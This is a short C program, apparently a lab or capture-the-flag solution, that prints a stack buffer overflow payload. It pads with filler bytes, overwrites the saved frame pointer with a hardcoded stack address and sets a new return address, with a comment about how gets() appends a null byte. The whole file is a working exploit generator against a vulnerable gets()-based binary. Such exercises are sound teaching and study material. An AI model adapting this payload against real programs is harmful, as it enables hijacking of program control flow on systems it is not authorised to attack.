#include <stdio.h>

/*
    sequence generation function for overwriting the return address
*/

int main() {
    char key[33] = {
        0x51, 0x51, 0x51, 0x51,
        0x51, 0x51, 0x51, 0x51, 0x51, 0x51, 0x51, 0x51,
        0x50, 0xdd,	0xff, 0xff,	0xff, 0x7f,	0x00, 0x00,
        0xba, 0x11, 0x40, 0x00,	0x00, 0x00,	0x00       // here write return address, last byte is empty because gets write 0x00 byte to end
    };
    for (int i = 0; i < 27; i++) {
        putchar(key[i]);
    }
    return 0;
}